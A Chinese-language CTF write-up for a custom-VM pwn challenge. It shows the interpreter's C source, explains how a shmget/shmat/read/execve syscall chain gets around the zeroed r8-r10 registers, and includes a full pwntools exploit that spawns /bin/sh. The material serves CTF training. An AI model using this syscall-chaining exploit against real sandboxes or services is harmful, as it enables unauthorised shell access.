# vm-syscall

## 题目简述

题目是自定义 VM pwn。程序读取最多 `0x200` 字节 VM 字节码到 `mmap` 区域，随后把代码页改成只读并解释执行。VM 有 4 个通用寄存器，算术/赋值指令可以控制寄存器值，`case4` 会把 `reg[0..3]` 映射到 Linux syscall 的 `rax/rdi/rsi/rdx` 并执行 `syscall`，然后把返回值写回 `reg[0]`。

难点在于 `case4` 执行 syscall 前会清零 `r8/r9/r10`，因此常规 `mmap` 方案不可用。可行路线是先调用 `shmget` 创建共享内存段，再用 `shmat` 取得可写地址，把 `/bin/sh` 写入该地址，最后调用 `execve(addr, 0, 0)` 获取 shell。

## 解题过程

### 源码

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
typedef struct node {
    char *code_addr;
    unsigned int ip;
    size_t reg[4];
    unsigned int offset[3];
    size_t number;
} node;
node *vm_node = NULL;
unsigned char get() {
    if (vm_node->ip>0x200) {
        puts("Out of code scope!");
exit(0);
    }
    unsigned char byte = vm_node->code_addr[vm_node->ip];
    vm_node->ip += 1;
    return byte;
}
int init(int choice) {
    if (choice == 0) {
        for (int i=0;i<4;i++)
            vm_node->reg[i]=0;
        for (int i=0;i<3;i++)
            vm_node->offset[i]=0;
        vm_node->number=0;
        return 0;
    }
    if (choice == 1) {
        vm_node->offset[0]=get();
        vm_node->offset[1]=get();
        if (vm_node->offset[0]<=3 && vm_node->offset[1]<=3) return 0;
        return -1;
    }
    if (choice == 2) {
        for (int i=0;i<2;i++)
            vm_node->offset[i]=get();
        int len=get();
        if (len>4) {
            puts("Invalid length!");
            exit(0);
        }
        vm_node->number=0;
        for (int i=0;i<len;i++){
            vm_node->number=vm_node->number<<8;
            vm_node->number|=get();
        }
        if (vm_node->offset[0]<=3 && vm_node->offset[1]<=3) return 0;
        return -1;
    }
    if (choice ==3){
        for (int i=0;i<3;i++)
            vm_node->offset[i]=get();
        if (vm_node->offset[0]<=3 && vm_node->offset[1]<=3 && vm_node-
>offset[2]<=3) return 0;
        return -1;
    }
    if (choice ==4)  return 0;
    return -1;
}
void case1()
{
    int choice=get();
    size_t temp;
    switch (choice) {
        case 0x10:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]];
            break;
        case 0x20:
            vm_node->reg[vm_node->offset[1]]=vm_node->reg[vm_node->offset[0]];
            break;
        case 0x30:
            temp=vm_node->reg[vm_node->offset[0]];
vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]];
            vm_node->reg[vm_node->offset[1]]=temp;
            break;
        default:
            exit(0);
    }
}
void case2()
{
    int choice=get();
    switch (choice) {
        case 0x10:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]+vm_node->number;
            break;
        case 0x20:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]]-
vm_node->number;
            break;
        case 0x30:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]*vm_node->number;
            break;
        case 0x40:
            if (vm_node->number ==0){
            puts("Divide by zero!");
            exit(1);
            }
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]/vm_node->number;
            break;
        case 0x50:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]]
<<vm_node->number;
            break;
        case 0x60:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]>>vm_node->number;
            break;
        case 0x70:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]^vm_node->number;
            break;
        case 0x80:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]&vm_node->number;
            break;
        case 0x90:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]|vm_node->number;
            break;
        default:
            exit(0);
    }
}
void case3()
{
    int choice=get();
    switch (choice) {
        case 0x10:
vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]+vm_node->reg[vm_node->offset[2]];
            break;
        case 0x20:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]]-
vm_node->reg[vm_node->offset[2]];
            break;
        case 0x30:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]*vm_node->reg[vm_node->offset[2]];
            break;
        case 0x40:
            if (vm_node->reg[vm_node->offset[2]]==0){
            puts("Divide by zero!");
            exit(1);
            }
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]/vm_node->reg[vm_node->offset[2]];
            break;
        case 0x50:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node->offset[1]]
<<vm_node->reg[vm_node->offset[2]];
            break;
        case 0x60:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]>>vm_node->reg[vm_node->offset[2]];
            break;
        case 0x70:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]^vm_node->reg[vm_node->offset[2]];
            break;
        case 0x80:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]&vm_node->reg[vm_node->offset[2]];
            break;
        case 0x90:
            vm_node->reg[vm_node->offset[0]]=vm_node->reg[vm_node-
>offset[1]]|vm_node->reg[vm_node->offset[2]];
            break;
        default:
            exit(0);
    }
}
void case4(size_t *reg_addr) {
    asm volatile (
        "push %%rbx\n\t"
        "xor %%r8, %%r8\n\t"
        "xor %%r9, %%r9\n\t"
        "xor %%r10, %%r10\n\t"
        "mov %0, %%rbx\n\t"
        "mov (%%rbx), %%rax\n\t"
        "mov 8(%%rbx), %%rdi\n\t"
        "mov 16(%%rbx), %%rsi\n\t"
        "mov 24(%%rbx), %%rdx\n\t"
        "syscall\n\t"
        "mov %%rax, (%%rbx)\n\t"
        "pop %%rbx\n\t"
        :
        : "r" (reg_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "rbx",
"memory"
);
}
void run() {
    unsigned char choice;
    while (vm_node->ip<=0x200){
    choice = get();
    if (init(choice)==-1) {
        puts("Invalid choice!");
        exit(0);
    }
    switch (choice) {
        case 0:
            puts("Blessed are the people who have nothing, for they shall have
everything!");
            break;
        case 1:
            case1();
            break;
        case 2:
            case2();
            break;
        case 3:
            case3();
            break;
        case 4:
            case4(&vm_node->reg[0]);
            break;
        default:
            puts("Invalid choice!");
            exit(0);
    }
    }
}
int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    vm_node = (node*)malloc(sizeof(node));
    memset(vm_node, 0, sizeof(node));
    vm_node->code_addr = mmap(NULL, 0x1000, 3, 0x22, -1, 0);
    puts("Enter your code:");
    read(0, vm_node->code_addr, 0x200);
    mprotect(vm_node->code_addr,0x1000,1);
    run();
    free(vm_node);
    return 0;
}
```

### 解析

常规的vm pwn，通过控制寄存器配合syscall来getshell
对于寄存器，给出的指令集里控制的方法很多
值得注意的是syscall的返回值rax也会被存回reg[0]里，这是本题利用的关键所在
难点在于，在开启了pie和aslr的情况下，如何有一个字段可以写/bin/sh，或者/flag
常规的思路是利用mmap系统调用，不过在syscall前，r8~10全部被清零，导致mmap一定会失败
因此需要借助到shmget，shmat这两个系统调用来分配
shmid=shmget(0x50,0x80,0x3b6)

0x50这个key的值去内核维护的一个全局的共享内存段中寻找
0x80表示要创建的共享内存段的大小
0x3b6的八进制为01666，其中01000表示IPC_CREAT，如果这个key对应的段不存在，就会创建一个段，00666
表示权限为可读可写（区别于mprotect和mmap的是，shmget的权限是ipc权限，并不是内存段的权限，所以会有
一些不同，即此处r=4，w=2，x=1，因此6表示rw）
返回值为shmid，表示这个系统调用找到或者创建的段
addr=shmat(shmid,0,0)
根据shmget返回的shmid，执行完后返回值会是一个地址，也就是共享内存段的起始地址
之后read(0,addr,0)，写入/bin/sh
再execve(addr,0,0) getshell即可

### Exp

```
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
#io=remote("127.0.0.1",1337)
def dbg():
    gdb.attach(io)
    pause()
#shmid=shmget(0x50,0x80,0x3b6)
opcode=p8(2)+p8(0)+p8(0)+p8(1)+p8(29)+p8(0x10)#rax=29
opcode+=p8(2)+p8(1)+p8(1)+p8(1)+p8(0x60)+p8(0x10)#rdi=0x50
opcode+=p8(2)+p8(2)+p8(2)+p8(1)+p8(0x80)+p8(0x10)#rsi=0x80
opcode+=p8(2)+p8(3)+p8(3)+p8(2)+p8(3)+p8(0xb6)+p8(0x10)#rdx=0x3b6
opcode+=p8(4)
#addr=shmat(shmid,0,0)
opcode+=p8(1)+p8(0)+p8(1)+p8(0x30)#xchg rdi,rax rdi=rax shmid
opcode+=p8(2)+p8(0)+p8(0)+p8(1)+p8(0)+p8(0x80)#rax=0
opcode+=p8(2)+p8(0)+p8(0)+p8(1)+p8(30)+p8(0x10)#rax=30
opcode+=p8(2)+p8(2)+p8(2)+p8(1)+p8(0)+p8(0x80)#rsi=0
opcode+=p8(2)+p8(3)+p8(3)+p8(1)+p8(0)+p8(0x80)#rdx=0
opcode+=p8(4)
#read(0,addr,0x10)
opcode+=p8(1)+p8(0)+p8(2)+p8(0x30)#xchg rsi,rax rsi=rax addr
opcode+=p8(2)+p8(0)+p8(0)+p8(1)+p8(0)+p8(0x80)#rax=0
opcode+=p8(2)+p8(1)+p8(1)+p8(1)+p8(0)+p8(0x80)#rdi=0
opcode+=p8(2)+p8(3)+p8(3)+p8(1)+p8(0)+p8(0x80)#rdx=0
opcode+=p8(2)+p8(3)+p8(3)+p8(1)+p8(0x10)+p8(0x10)#rdx=0x10
opcode+=p8(4)
#execve(addr,0,0)
opcode+=p8(1)+p8(1)+p8(2)+p8(0x30)#xchg rsi,rax rdi=rsi addr
opcode+=p8(2)+p8(0)+p8(0)+p8(1)+p8(0)+p8(0x80)#rax=0
opcode+=p8(2)+p8(0)+p8(0)+p8(1)+p8(0x3b)+p8(0x10)#rax=0x3b
opcode+=p8(2)+p8(2)+p8(2)+p8(1)+p8(0)+p8(0x80)#rsi=0
opcode+=p8(2)+p8(3)+p8(3)+p8(1)+p8(0)+p8(0x80)#rdx=0
opcode+=p8(4)
dbg()
io.recvuntil("Enter your code:\n");
io.sendline(opcode)
pause()
io.sendline(b'/bin/sh\x00')
io.interactive()
```

## 方法总结

VM syscall 题的核心是先建立“虚拟寄存器到真实 syscall 参数”的对应关系，再看哪些真实寄存器被固定或清零。`rax` 返回值会写回 VM 寄存器时，可以把一个 syscall 的结果作为下一次 syscall 的参数继续使用。本题因为 `r8-r10` 被清零，不能直接 `mmap`，但 SysV 共享内存的 `shmget/shmat` 只依赖前三个参数，正好绕过这个限制。
